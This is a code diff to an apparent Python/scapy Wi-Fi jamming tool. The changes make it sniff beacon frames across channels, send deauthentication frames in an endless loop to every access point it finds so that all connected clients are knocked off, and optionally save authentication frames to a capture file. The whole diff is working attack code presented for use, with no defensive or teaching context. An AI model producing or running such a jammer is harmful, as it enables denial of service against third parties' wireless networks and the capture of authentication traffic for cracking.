@@ -1,13 +1,16 @@
 #!/bin/python3
 import argparse
 import threading
-from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap
+from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap, Dot11Elt
 from scapy.utils import PcapWriter
-from scapy.sendrecv import sniff
+from scapy.volatile import RandMAC
+from scapy.sendrecv import sniff, sendp
 from subprocess import Popen
 from time import sleep
 
 global AP_list
+global ignore_AP
+ignore_AP = []
 AP_list = []
 
 parser = argparse.ArgumentParser()
@@ -15,8 +18,8 @@ group = parser.add_mutually_exclusive_group()
 
 parser.add_argument('interface', action='store', help='Sets the interface to use for sending and receiving')
 
-group.add_argument('-l', '--ignore-list', dest='list', action='store', type=list, help='Ignore APs given by command line input (each MAC separated by spaces)')
-group.add_argument('-f', '--ignore-file', dest='file', action='store', type=str, help='Ignore APs from this file (each MAC separated by newlines)')
+group.add_argument('-l', '--ignore-list', dest='list', action='store', type=list, help='Ignore APs given by command line input (each MAC or SSID separated by spaces)')
+group.add_argument('-f', '--ignore-file', dest='file', action='store', type=str, help='Ignore APs from this file (each MAC or SSID separated by newlines)')
 
 parser.add_argument('-o', '--output', dest='output', action='store', type=str, help='File to write captured Auth Frames to (will only jam if not set)')
 parser.add_argument('-v', '--verbose', dest='verbose', action='store_true', help='Enable verbose logging', default=False)
@@ -43,10 +46,10 @@ else:
 		return None
 
 if args.list:
-	ignore_AP = args.list
+	ignore_AP += args.list
 elif args.file:
 	with open(args.file, 'r') as file:
-		ignore_AP = [file.readlines()]
+		ignore_AP += file.readlines()
 
 if args.output:
 	output = PcapWriter(args.output, append=True)
@@ -59,31 +62,28 @@ def channelHop(iface, channels):
 	while True:
 		for channel in channels:
 			changeChannel(iface, channel)
-			sleep(1)
+			sleep(0.1)
 
 def jammer():
-	if len(AP_list) != 0:
-		for AP in AP_list:
-			verboseOutput(1, f'De-Authenticating All Clients on AP {AP}')
-			DeAuth_Frame = RadioTap()/Dot11(addr1 = RandMAC(), addr2 = AP, addr3 = AP)/Dot11Deauth(reason=2)
-			sendp(DeAuth_Frame)
+	while True:
+		if len(AP_list) != 0:
+			for AP in AP_list:
+				verboseOutput(1, f'De-Authenticating All Clients on AP {AP}')
+				DeAuth_Frame = RadioTap()/Dot11(addr1 = RandMAC(), addr2 = AP, addr3 = AP)/Dot11Deauth(reason=2)
+				sendp(DeAuth_Frame, verbose=False)
 
 def packetHandler(packet):
-	print("Found packet")
 	if packet.haslayer(Dot11):
-		if packet.addr2 not in ignore_AP:
-			if packet.type == 0:
-				verboseOutput(1, f'Found Management Frame')
-				if packet.subtype == 8:
-					verboseOutput(1, f'Found Beacon Frame')
+		if packet.type == 0:
+			if packet.subtype == 8:
+				if packet.addr2 not in ignore_AP or packet[Dot11Elt].info not in ignore_AP:
 					if packet.addr2 not in AP_list:
 						AP_list.append(packet.addr2)
 						verboseOutput(1, f'Access Point Found: {packet.addr2}')
-				elif packet.subtype == 11:
-					verboseOutput(1, f'Found Authentication Frame')
-					if output:
-						output.write(packet)
-						verboseOutput(1, f'Authentication Frame Found for AP {packet.addr2}')
+			elif packet.subtype == 11:
+				if output:
+					output.write(packet)
+					verboseOutput(1, f'Authentication Frame Found for AP {packet.addr2}')
 
 channelHopper = threading.Thread(target = channelHop, args=(args.interface, args.channels))
 beaconSniffer = threading.Thread(target = sniff, kwargs = dict(prn=packetHandler, iface=args.interface))
